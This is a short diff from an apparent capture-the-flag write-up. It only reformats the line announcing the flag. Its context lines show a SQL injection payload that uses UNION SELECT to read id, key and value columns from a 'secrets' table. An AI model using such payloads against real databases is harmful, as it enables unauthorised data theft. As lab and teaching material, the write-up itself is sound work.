@@ -120,5 +120,5 @@ We can now see a table name secrets.
 ' union select 1,`id`,`key`,`value` from secrets-- -
 ```
 
-Now we got the flag
+`Now we got the flag`
 ![alt text](/Writeups/images/image-12.png)
